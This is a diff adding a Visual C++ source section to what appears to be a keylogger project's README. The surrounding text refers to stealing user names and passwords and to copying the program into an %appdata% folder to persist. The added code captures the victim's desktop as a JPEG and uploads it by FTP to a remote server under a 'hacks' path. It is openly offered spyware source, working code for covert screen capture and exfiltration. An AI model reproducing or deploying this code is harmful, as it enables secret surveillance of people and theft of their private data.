@@ -28,4 +28,96 @@ user names, passwords, and other private data.
 
 - AutoCopy : Keylogger has functionaility to auto copy in %appdata%/roaming/wpdnse/ folder.
 
+### Visual C++ Source Code
 
+Capture Screenshot
+
+```
+void screenshot(string file){
+	ULONG_PTR gdiplustoken;
+	GdiplusStartupInput gdistartupinput;
+	GdiplusStartupOutput gdistartupoutput;
+
+	gdistartupinput.SuppressBackgroundThread = true;
+	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput); //start GDI+
+
+	HDC dc=GetDC(GetDesktopWindow());//get desktop content
+	HDC dc2 = CreateCompatibleDC(dc);	 //copy context
+
+	RECT rc0kno;
+
+	GetClientRect(GetDesktopWindow(),&rc0kno);// get desktop size;
+	int w = rc0kno.right-rc0kno.left;//width
+	int h = rc0kno.bottom-rc0kno.top;//height
+
+	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);//create bitmap
+	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);
+
+	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);//copy pixel from pulpit to bitmap
+	Bitmap* bm= new Bitmap(hbitmap,NULL);
+
+	UINT num;
+	UINT size;
+
+	ImageCodecInfo *imagecodecinfo;
+	GetImageEncodersSize(&num,&size); //get count of codec
+
+	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
+	GetImageEncoders (num,size,imagecodecinfo);//get codec
+
+	CLSID clsidEncoder;
+
+	for(int i=0; i < num; i++)
+	{
+		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
+			clsidEncoder = imagecodecinfo[i].Clsid;//get jpeg codec id
+
+	}
+
+	free(imagecodecinfo);
+
+	wstring ws;
+	ws.assign(file.begin(),file.end());//sring to wstring
+	bm->Save(ws.c_str(),& clsidEncoder); //save in jpeg format
+	SelectObject(dc2,holdbitmap);//Release Objects
+	DeleteObject(dc2);
+	DeleteObject(hbitmap);
+
+	ReleaseDC(GetDesktopWindow(),dc);
+	GdiplusShutdown(gdiplustoken);
+
+}
+
+```
+
+Send Screenshot to Server Via FTP
+
+```
+void ftp_scrshot_send(){
+
+	HINTERNET hInternet;
+	HINTERNET hFtpSession;
+
+	DWORD rec_timeout = 5000;
+
+	hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
+		if(hInternet == NULL){
+			log_error_file<<"Error:"<<GetLastError();
+		}
+		else{
+			hFtpSession = InternetConnect(hInternet,"192.168.8.2",2121,NULL,NULL,INTERNET_SERVICE_FTP,0,0);
+			InternetSetOption(hInternet,INTERNET_OPTION_SEND_TIMEOUT,&rec_timeout,sizeof(rec_timeout));
+			if(hFtpSession == NULL){
+
+				log_error_file<<"Error:"<<GetLastError();
+			}
+			else{
+				if(!FtpPutFile(hFtpSession,"core32.mni","hacks/sc/dc.jpg",FTP_TRANSFER_TYPE_BINARY,0)){
+					log_error_file<<"Error:"<<GetLastError();
+				}
+			}	
+		}
+
+	log_error_file.close();
+}
+```
